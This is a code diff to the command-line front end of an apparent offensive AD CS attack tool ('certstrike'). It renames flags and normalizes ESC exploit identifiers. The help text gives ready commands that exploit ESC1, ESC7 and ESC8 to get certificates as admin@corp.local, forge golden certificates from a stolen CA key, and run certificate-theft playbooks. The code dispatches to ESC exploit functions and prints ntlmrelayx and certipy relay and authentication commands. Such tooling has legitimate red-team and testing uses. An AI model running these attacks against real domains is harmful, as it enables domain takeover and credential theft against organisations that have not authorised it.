@@ -26,27 +26,37 @@ Examples:
   certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --json
   certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --stealth
   certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee
-  certstrike pki --exploit esc1 --template VulnTemplate --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
-  certstrike pki --exploit esc7 --ca CorpCA --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
-  certstrike pki --exploit esc8 --template Machine --target-dc dc01.corp.local --domain corp.local -u user -p pass --listener-ip 10.0.0.5
+  certstrike pki --esc 1 --template VulnTemplate --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
+  certstrike pki --esc 7 --ca CorpCA --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
+  certstrike pki --esc 8 --template Machine --target-dc dc01.corp.local --domain corp.local -u user -p pass --listener-ip 10.0.0.5
   certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt
   certstrike pki --report --format markdown --output findings.md --target-dc dc01.corp.local --domain corp.local -u user -p pass
-  certstrike pki --cert-theft all
+  certstrike pki --theft all
   certstrike pki --import-pfx cert.pfx`,
 	RunE: func(cmd *cobra.Command, args []string) error {
 		doEnum, _ := cmd.Flags().GetBool("enum")
 		doForge, _ := cmd.Flags().GetBool("forge")
-		exploit, _ := cmd.Flags().GetString("exploit")
+		exploit, _ := cmd.Flags().GetString("esc")
+		if exploit == "" {
+			exploit, _ = cmd.Flags().GetString("exploit") // legacy
+		}
 		doAutoDetect, _ := cmd.Flags().GetBool("auto-detect")
 		importPFX, _ := cmd.Flags().GetString("import-pfx")
 		doReport, _ := cmd.Flags().GetBool("report")
-		certTheft, _ := cmd.Flags().GetString("cert-theft")
+		certTheft, _ := cmd.Flags().GetString("theft")
+		if certTheft == "" {
+			certTheft, _ = cmd.Flags().GetString("cert-theft") // legacy
+		}
 
 		if !doEnum && !doForge && exploit == "" && !doAutoDetect && importPFX == "" && !doReport && certTheft == "" {
 			return cmd.Help()
 		}
 
 		if certTheft != "" {
+			// Accept bare numbers: --theft 1 → theft1
+			if len(certTheft) <= 2 && certTheft[0] >= '0' && certTheft[0] <= '9' {
+				certTheft = "theft" + certTheft
+			}
 			pki.PrintCertTheftPlaybook(certTheft)
 			return nil
 		}
@@ -452,32 +462,34 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 	var certKey *ecdsa.PrivateKey
 	var err error
 
-	switch strings.ToLower(exploit) {
-	case "esc1":
+	// Normalize: accept "1", "esc1", "ESC1" etc.
+	escID := strings.ToLower(strings.TrimPrefix(strings.ToLower(exploit), "esc"))
+	switch escID {
+	case "1":
 		cert, certKey, err = pki.ExploitESC1(cfg, templateName, upn)
-	case "esc2":
+	case "2":
 		cert, certKey, err = pki.ExploitESC2(cfg, templateName, upn)
-	case "esc3":
+	case "3":
 		cert, certKey, err = pki.ExploitESC3(cfg, templateName, upn)
-	case "esc4":
+	case "4":
 		cert, certKey, err = pki.ExploitESC4(cfg, templateName, upn)
-	case "esc6":
+	case "6":
 		cert, certKey, err = pki.ExploitESC6(cfg, templateName, upn)
-	case "esc7":
+	case "7":
 		caName, _ := cmd.Flags().GetString("ca")
 		if caName == "" {
 			return fmt.Errorf("--ca is required for ESC7 exploitation (target CA name)")
 		}
 		cert, certKey, err = pki.ExploitESC7(cfg, caName, upn)
-	case "esc9":
+	case "9":
 		attackerDN, _ := cmd.Flags().GetString("attacker-dn")
 		if attackerDN == "" {
 			return fmt.Errorf("--attacker-dn is required for ESC9 exploitation (attacker's LDAP DN)")
 		}
 		cert, certKey, err = pki.ExploitESC9(cfg, templateName, attackerDN, upn)
-	case "esc13":
+	case "13":
 		cert, certKey, err = pki.ExploitESC13(cfg, templateName, upn)
-	case "esc8":
+	case "8":
 		// ESC8 is a relay attack — scan for the endpoint and print the ntlmrelayx command
 		esc8Findings, scanErr := pki.ScanESC8(cfg)
 		if scanErr != nil {
@@ -506,7 +518,7 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		fmt.Println("\n[*] After obtaining the certificate via relay:")
 		fmt.Printf("    certipy auth -pfx <cert.pfx> -dc-ip %s\n", cfg.TargetDC)
 		return nil
-	case "esc12":
+	case "12":
 		// ESC12 is a DCOM-based attack — scan for accessible DCOM endpoints and print the relay command
 		esc12Findings, scanErr := pki.ScanESC12(cfg)
 		if scanErr != nil {
@@ -526,7 +538,7 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		fmt.Printf("    certipy auth -pfx <cert.pfx> -dc-ip %s\n", cfg.TargetDC)
 		return nil
 	default:
-		return fmt.Errorf("unsupported exploit: %s (supported: esc1, esc2, esc3, esc4, esc6, esc7, esc8, esc9, esc12, esc13)", exploit)
+		return fmt.Errorf("unsupported ESC: %s (supported: 1, 2, 3, 4, 6, 7, 8, 9, 12, 13)", exploit)
 	}
 
 	if err != nil {
@@ -672,11 +684,15 @@ func init() {
 	// Action flags
 	pkiCmd.Flags().Bool("enum", false, "Enumerate ADCS certificate templates")
 	pkiCmd.Flags().Bool("forge", false, "Forge a golden certificate")
-	pkiCmd.Flags().String("exploit", "", "Exploit ESC vulnerability (esc1, esc2, esc3, esc4, esc6, esc7, esc8, esc9, esc12, esc13)")
+	pkiCmd.Flags().String("esc", "", "Exploit ESC vulnerability (1-14, e.g. --esc 1)")
+	pkiCmd.Flags().String("exploit", "", "Alias for --esc")
+	pkiCmd.Flags().MarkHidden("exploit")
 	pkiCmd.Flags().Bool("auto-detect", false, "Auto-detect ESC vulnerabilities and prioritize attack paths")
 	pkiCmd.Flags().String("import-pfx", "", "Import and display info from a PKCS12/PFX file")
 	pkiCmd.Flags().Bool("report", false, "Generate engagement report from full ADCS enumeration")
-	pkiCmd.Flags().String("cert-theft", "", "Display certificate theft playbook (theft1, theft2, theft3, theft4, theft5, all)")
+	pkiCmd.Flags().String("theft", "", "Certificate theft playbook (1-5 or all)")
+	pkiCmd.Flags().String("cert-theft", "", "Alias for --theft")
+	pkiCmd.Flags().MarkHidden("cert-theft")
 
 	// Connection flags
 	pkiCmd.Flags().String("target-dc", "", "Target domain controller hostname")
